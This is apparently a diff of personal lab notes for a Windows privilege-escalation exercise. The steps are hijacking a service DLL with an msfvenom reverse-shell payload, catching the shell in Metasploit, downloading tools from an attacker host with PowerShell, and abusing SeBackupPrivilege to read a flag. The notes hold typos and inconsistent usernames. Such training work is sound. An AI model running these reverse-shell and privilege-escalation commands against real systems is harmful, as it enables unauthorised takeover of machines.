@@ -53,12 +53,13 @@ EnterpriseService   Running "C:\Services\EnterpriseService.exe"
 
 # Now we knew that EnterpriseServiceOptional.dll is missing
 # Lets create the payload 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.223 LPORT=9999 -f dll -o EnterpriseServiceOptional.dll
+# Troubleshoot update: we need to use x64 to make the .dll run with the software... 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9999 -f dll -o EnterpriseServiceOptional.dll
 
 # Listen to the payload
 msfconsole
 msf6> use multi/handler
-msf6> set payload windows/x64/shell_reverse_tcp 
+msf6> set payload windows/x64/shell_reverse_tcp  
 msf6> set LHOST tun0
 msf6> set LPORT 9999
 msf6> run
@@ -68,9 +69,47 @@ PS C:\Users\alex> cd C:\Services
 PS C:\Services> iwr -uri http://192.168.45.223/EnterpriseServiceOptional.dll -Outfile EnterpriseServiceOptional.dll
 PS C:\Services> Restart-Service EnterpriseService
 
+C:\Windows\system32>whoami
+clientwk222\enterpriseuser
+SeBackupPrivilege             Back up files and directories             Disabled
+SeRestorePrivilege            Restore files and directories             Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
 
+# SEImpersonatePrivilege is enabled
+# Prepare the exploit tools
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
 
+# Upload the exploit tools
+C:\Users\dave> powershell
+PS C:\Users\enterpriseuser> iwr -uri http://192.168.45.223/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 
+PS C:\Users\enterpriseuser> .\PrintSpoofer64.exe -i -c powershell.exe
+...
+failed
+...
 
+# From hint showing we can try to enable SeBackupPrivilege to retrive the flags.
+https://github.com/giuliano108/SeBackupPrivilege/tree/master
 
+PS C:\Users\enterpriseuser\Desktop> iwr -uri http://192.168.45.219/SeBackupPrivilegeUtils.dll -Outfile SeBackupPrivilegeUtils.dll
+PS C:\Users\enterpriseuser\Desktop> iwr 0uri http://192.168.45.219/SeBackupPrivilegeCmdLets.dll -Outfile SeBackupPrivilegeCmdLets.dll
 
+PS C:\Users\enterpriseuser\Desktop> Import-Module .\SeBackupPrivilegeUtils.dll
+PS C:\Users\enterpriseuser\Desktop> Import-Module .\SeBackupPrivilegeCmdLets.dll
+PS C:\Users\enterpriseuser\Desktop> Get-SeBackupPrivilege
+PS C:\Users\enterpriseuser\Desktop> Set-SeBackupPrivilege
+SeBackupPrivilege is enabled
+whoami /priv
+...
+SeBackupPrivilege   Back up files and directories       Enabled 
+...
+
+PS C:\Users\enterpriseadmin\Desktop> Copy-FileSeBackupPrivilege .\flag.txt C:\Services\flag.txt
+PS C:\Services> type flag.txt
+OS{81e8f79d35389ae10d5108e77f76db27}
